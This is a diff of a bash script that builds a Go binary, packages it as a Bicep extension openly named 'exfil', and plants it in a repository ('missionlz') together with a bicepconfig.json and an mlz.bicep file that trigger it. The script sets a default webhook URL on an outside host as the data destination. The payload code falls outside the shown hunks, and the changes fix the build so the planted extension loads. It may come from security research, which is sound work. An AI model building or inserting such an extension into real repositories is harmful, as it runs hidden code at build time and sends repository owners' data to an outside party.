@@ -1,16 +1,17 @@
 #!/bin/bash
 
 WEBHOOK_URL="${1:-https://lamian.robertprast.com}"
-REPO_PATH="${2:-.}"
+REPO_PATH="/private/tmp/missionlz"
 
-mkdir -p "$REPO_PATH/src/exfil-extension"
-cd "$REPO_PATH/src/exfil-extension"
+# Build in a proper directory (not system temp root)
+BUILDDIR="$REPO_PATH/.build-tmp"
+rm -rf "$BUILDDIR"
+mkdir -p "$BUILDDIR"
+cd "$BUILDDIR"
 
-# Create Go module
-cat > go.mod << 'GOMOD'
-module exfil-extension
-go 1.21
-GOMOD
+# Initialize Go module properly
+export GO111MODULE=on
+go mod init exfil-extension
 
 # Create main.go
 cat > main.go << 'GOCODE'
@@ -47,7 +48,7 @@ GOCODE
 # Build static binary for Linux
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o extension-linux-x64 .
 
-# Create index.json with PascalCase Settings object
+# Create index.json with proper bicep types format
 cat > index.json << 'INDEX'
 {
   "Settings": {
@@ -55,9 +56,34 @@ cat > index.json << 'INDEX'
     "Version": "1.0.0",
     "IsSingleton": true
   },
-  "Types": [],
-  "Resources": {},
-  "Functions": {}
+  "Types": [
+    {
+      "$type": "StringType"
+    },
+    {
+      "$type": "ObjectType",
+      "Name": "Trigger",
+      "Properties": {
+        "name": {
+          "Type": {
+            "$ref": "#/0"
+          },
+          "Flags": 1,
+          "Description": "Resource name"
+        }
+      }
+    },
+    {
+      "$type": "ResourceType",
+      "Name": "Trigger@v1",
+      "ScopeType": 0,
+      "Body": {
+        "$ref": "#/1"
+      },
+      "Flags": 0
+    }
+  ],
+  "ResourceFunctions": {}
 }
 INDEX
 
@@ -70,11 +96,11 @@ mv types.tar.gz types.tgz
 tar -cvf exfil.tar types.tgz extension-linux-x64
 gzip -f exfil.tar
 
-# Move to extensions folder
+# Setup repo structure
 mkdir -p "$REPO_PATH/src/extensions"
 mv exfil.tar.gz "$REPO_PATH/src/extensions/"
 
-# Create bicepconfig.json
+# Create bicepconfig.json in src/
 cat > "$REPO_PATH/src/bicepconfig.json" << 'CONFIG'
 {
   "experimentalFeaturesEnabled": {
@@ -86,7 +112,7 @@ cat > "$REPO_PATH/src/bicepconfig.json" << 'CONFIG'
 }
 CONFIG
 
-# Create bicep file
+# Create bicep file in src/
 cat > "$REPO_PATH/src/mlz.bicep" << 'BICEP'
 extension exfil
 
@@ -95,7 +121,11 @@ resource trigger 'exfil:Trigger@v1' = {
 }
 BICEP
 
+# Cleanup build directory
 cd "$REPO_PATH"
-rm -rf "$REPO_PATH/src/exfil-extension"
+rm -rf "$BUILDDIR"
 
-echo "Done! Created extension at $REPO_PATH/src/extensions/exfil.tar.gz"
+echo "Done! Files created:"
+echo "  - $REPO_PATH/src/extensions/exfil.tar.gz"
+echo "  - $REPO_PATH/src/bicepconfig.json"
+echo "  - $REPO_PATH/src/mlz.bicep"
